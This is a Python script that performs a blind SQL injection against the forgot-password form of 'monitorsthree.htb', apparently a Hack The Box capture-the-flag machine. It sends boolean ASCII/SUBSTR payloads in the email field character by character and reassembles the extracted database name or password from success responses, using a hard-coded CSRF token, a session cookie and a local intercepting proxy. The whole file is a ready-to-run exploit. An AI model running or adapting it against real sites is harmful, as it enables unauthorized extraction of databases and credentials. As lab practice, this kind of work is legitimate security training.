import requests
import urllib3
import string
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
chars=string.printable
password=[]
#YELLOW = "\033[33m"

#	only thing left is to deal with '.' and '/' chars since '%' fsreason matches them (doing ASCII may help)
#	also deal with password end
#


print("\n--+--  Starting on blind sql probe  --+--\n")
# CHANGE -> change sqli on line 20 !!!!
for i in range(1,62):
	for char_dec in range(32,127):
		proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
		url="http://monitorsthree.htb/forgot_password.php"
		sqli_payload=f"blabla' or ASCII(SUBSTR((select database() LIMIT 1), {i}, 1)) collate utf8mb4_bin = '{char_dec}'-- -"
		form_data={'_token': 'JoIK085HLwVbX7ym98y9P8GoHxHDtlH5DLploQda','email': sqli_payload}
		headers={
		    "Host": "monitorsthree.htb",
		    "Upgrade-Insecure-Requests": "1",
		    "Origin": "http://monitorsthree.htb",
		    "Content-Type": "application/x-www-form-urlencoded",
		    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
		    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		    "Referer": "http://monitorsthree.htb/forgot_password.php",
		    "Accept-Encoding": "gzip, deflate, br",
		    "Accept-Language": "en-US,en;q=0.5",
		    "Connection": "close",
		    "Cookie": "PHPSESSID=3r7u0hb3cicipqqahekadn36n7"
			}
		response=requests.post(url,data=form_data,headers=headers,verify=False,allow_redirects=True)
		#print(response.text)
		if('Successfully' in response.text):	#CHANGE -> based on response text on succesful guess
			password.append(chr(char_dec))
			
			print(f"found {i}-th char: ",chr(char_dec),"ASCII code: ",char_dec)
			break
		
		

print(f"\n\n--+--  Full pass is:\n{''.join(password)}  --+--")
